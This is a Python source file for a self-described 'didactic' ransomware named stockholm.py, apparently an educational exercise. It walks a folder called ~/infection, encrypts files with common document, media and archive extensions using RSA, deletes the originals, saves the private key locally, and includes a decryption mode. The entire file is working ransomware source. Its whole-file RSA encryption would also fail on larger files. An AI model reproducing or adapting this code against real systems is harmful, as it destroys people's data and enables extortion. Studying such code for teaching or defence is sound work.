import os, argparse, pyfiglet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
extensions = {
'123', '3dm', '3ds', '3g2', '3gp', '602', '7z', 'arc', 'csv', 'doc', 'docx', 'dot', 'dotm', 'dotx', 'dwg', 'dxf',
'flv', 'gif', 'hwp', 'iso', 'iv2i', 'jpg', 'jpeg', 'lay', 'mdb', 'mdf', 'mid', 'moneywell', 'mov', 'mp3', 'mp4',
'mpeg', 'msg', 'myd', 'nef', 'odb', 'odg', 'odp', 'ods', 'odt', 'ora', 'paq', 'pdf', 'pef', 'pfx', 'php', 'png',
'pot', 'potm', 'potx', 'ppam', 'pps', 'ppsm', 'ppsx', 'ppt', 'pptm', 'pptx', 'psd', 'rar', 'raw', 'rtf', 'sql',
'sr2', 'srt', 'svg', 'swf', 'tar', 'tiff', 'txt', 'vbx', 'vsd', 'wav', 'wma', 'wmv', 'xla', 'xlam', 'xls', 'xlsb',
'xlsm', 'xlsx', 'xlt', 'xltm', 'xltx', 'xml', 'zip'
}
home = os.path.expanduser('~')
infection_dir = home + "/" + "infection"
en_list = []
for path, directories, files in os.walk(infection_dir):
    for file in files:
        abs_path = os.path.join(path, file)
        en_list.append(abs_path)

def genkeys():
    #Generate private key
    private_key = rsa.generate_private_key(public_exponent=65537,key_size=2048,backend=default_backend())

    #Parse private key from object to PEM format
    pemkey = private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption(),)
    #Write private key on a file
    try:
        with open('key.pem', 'wb') as privkey_content:
            privkey_content.write(pemkey)
    except(PermissionError):
        print("Can not create private key, check permissions")
        exit()
    #Generate public key
    public_key = private_key.public_key()
    return public_key

def version_fun():
    ascii_banner = pyfiglet.figlet_format("Didactic Ransom Version 1.0")
    print(ascii_banner)
    exit()

def check_key(reverse):
    if not os.path.exists(reverse):
        print("Can not find", reverse , "file")
        exit()

def import_key(reverse):
    try:
        with open(reverse, 'rb') as key_content:
            key = key_content.read()
            input_key = serialization.load_pem_private_key(key, password=None, backend=default_backend())
    except(OSError, ValueError) as e:
        print("Error reading key")
        print(e)
        exit()
    return input_key

def decrypt_files(key, silent):
    counter = 0
    try:
        for a in en_list:
            origin =  os.path.splitext(a)[0]
            if not a.endswith(".ft"):
                if not silent == True:
                    print("Not encrypted file. Skipping...")
            else:
                    with open (a, 'rb') as files:
                        content = files.read()
                    decrypted = key.decrypt(content,padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
                    with open (origin, 'wb') as decrypted_file:
                        decrypted_file.write(decrypted)
                    if not silent == True:
                        print(a, "has been decrypted!")
                    counter = counter ++ 1
                    os.remove(a)
    except(OSError, ValueError) as e:
        print("Error decrypting this file")
        print(e)
    print(counter, "files has been decrypted with imported key")
    exit()

def start_ransom(silent,public):
    #Read all directory files
    counter = 0
    try:
        for a in en_list:
            ext = a.split(".")[-1]
            if a.endswith(".ft") or ext not in extensions or os.path.isdir(a):
                if not silent == True:
                    print("Skipping file...")
            else:
                with open (a, 'rb') as files:
                    content = files.read()
                ciphertext = public.encrypt(content,padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
                with open (a + ".ft", 'wb') as encryted_file:
                    encryted_file.write(ciphertext)
                    if not silent == True:
                        print(a, "has been encrypted!")
                counter = counter ++ 1
                os.remove(a)
    except(OSError) as e:
        print("Error encrypting this file")
        print(e)
    print(counter, "files has been encrypted with the key saved on ./key.pem")


def main():
    parser = argparse.ArgumentParser(description="This is a didactic purpose ransomware. Use './stockholm.py' to encrypt the directory or use the -r option to decrypt it.")
    parser.add_argument("-v", "--version" , help="Displays version of the script", action="store_true")
    parser.add_argument("-s", "--silent" , help="Displays the program on silent mode", action="store_true") 
    parser.add_argument("-r" , "--reverse" , metavar="Decrypt_key" , help="Decrypts all the encrypted content using the key as an argument")
    args, unknown_args = parser.parse_known_args()

#Adding arguments to variables
    reverse = args.reverse
    silent = args.silent
    version = args.version

# Comprueba si no se han proporcionado argumentos desconocidos
    if version == True:
        version_fun()
        exit()

    if reverse == None:
        public = genkeys()
        start_ransom(silent,public)
        exit()

    if reverse:
        check_key(reverse)
        key = import_key(reverse)
        decrypt_files(key,silent)
        exit()

if __name__ == '__main__':
    main()